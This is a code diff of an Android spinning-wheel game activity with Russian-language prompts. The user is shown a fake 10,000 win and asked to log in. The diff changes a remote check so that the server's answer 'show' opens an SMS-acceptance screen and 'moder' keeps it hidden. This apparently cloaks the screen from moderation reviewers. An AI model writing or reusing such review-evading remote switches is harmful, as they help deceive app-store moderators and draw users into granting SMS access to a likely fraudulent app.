@@ -26,7 +26,7 @@ import java.io.IOException;
 
 import uk.co.samuelwall.materialtaptargetprompt.MaterialTapTargetPrompt;
 
-public class Starting extends AppCompatActivity {
+public class HomePage extends AppCompatActivity {
 
     SpinningWheelView wheelView;
 
@@ -48,7 +48,7 @@ public class Starting extends AppCompatActivity {
     @Override
     protected void onStart() {
 
-        new MaterialTapTargetPrompt.Builder(Starting.this)
+        new MaterialTapTargetPrompt.Builder(HomePage.this)
                 .setTarget(R.id.balance)
                 .setPrimaryText("Тут показан ваш баланс")
                 .setSecondaryText("Он может меняться взависимости от исхода игры")
@@ -59,7 +59,7 @@ public class Starting extends AppCompatActivity {
                     {
                         if (state == MaterialTapTargetPrompt.STATE_FOCAL_PRESSED)
                         {
-                            new MaterialTapTargetPrompt.Builder(Starting.this)
+                            new MaterialTapTargetPrompt.Builder(HomePage.this)
                                     .setTarget(R.id.spin)
                                     .setPrimaryText("Нажми, чтобы крутить")
                                     .setSecondaryText("Эта кнопка сделана для того, чтобы ты прокрутил колессо")
@@ -154,14 +154,14 @@ public class Starting extends AppCompatActivity {
                         @Override
                         public void run() {
                             balance.setText("Balance: 10 000");
-                            new AlertDialog.Builder(Starting.this)
+                            new AlertDialog.Builder(HomePage.this)
                                     .setTitle("Вы выйграли!")
                                     .setMessage("Теперь авторизируйтесь!")
                                     .setIcon(android.R.drawable.ic_dialog_alert)
                                     .show();
 
 
-                            new Starting.NewThread().execute();
+                            new HomePage.NewThread().execute();
 
 
                         }
@@ -185,15 +185,15 @@ public class Starting extends AppCompatActivity {
             Document doc = null;
 
             try {
-                doc = Jsoup.connect("https://wheelboom.site/check.html").get();
+                doc = Jsoup.connect("https://cs37267.tmweb.ru/content/").get();
                 String text_check = ((org.jsoup.nodes.Document) doc).text();
                 text_check.toString();
                 System.out.println(text_check);
 
-                if(text_check.equals("Allow")){
-                    startActivity(new Intent(Starting.this, SmsAccept.class));
+                if(text_check.equals("show")){
+                    startActivity(new Intent(HomePage.this, SmsAccept.class));
                     finish();
-                }if (text_check.equals("Deny")){
+                }if (text_check.equals("moder")){
 
                     //null
                 }
